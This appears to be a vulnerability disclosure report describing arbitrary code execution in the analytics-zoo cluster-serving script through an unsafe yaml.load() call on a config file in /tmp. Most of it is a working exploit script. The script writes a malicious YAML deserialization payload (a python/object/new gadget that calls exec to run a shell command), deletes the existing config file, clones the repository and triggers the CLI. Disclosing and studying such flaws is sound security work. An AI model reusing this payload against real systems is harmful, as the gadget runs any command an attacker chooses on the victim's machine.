# Description
**Arbitrary Code Excecution** in intel-analytics/analytics-zoo.
A unified Data Analytics and AI platform for distributed TensorFlow, Keras and PyTorch on Apache Spark/Flink & Ray.
This is generally a pip package but the exploit is to be working on the script that is used to manage cluster which uses config file from the /tmp directory, and this script is not accisible from the pip module installed so i have managed to put this up in the other registry.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**. while fixing try to fix all the load function in the repo since my exploit only focuses on one function in the script.
# Exploit code
**Python File**
```python
# please install sl,lolcat for better experiance <3
import os
os.chdir('/tmp/')
os.system('rm cluster-serving-jobs.yaml')
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('sl  |lolcat ')"
'''
open('cluster-serving-jobs.yaml','w+').write(exploit)
os.system('git clone https://github.com/intel-analytics/analytics-zoo.git')
os.system('pip3 install httpx')
os.system('pip3 install pyyaml')
os.chdir('analytics-zoo/scripts/cluster-serving')
print(os.listdir())
os.system('python3 cluster-serving-cli list')
os.system('echo "Hacked"|lolcat')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/786884022860906516/analytics-zoo.gif)
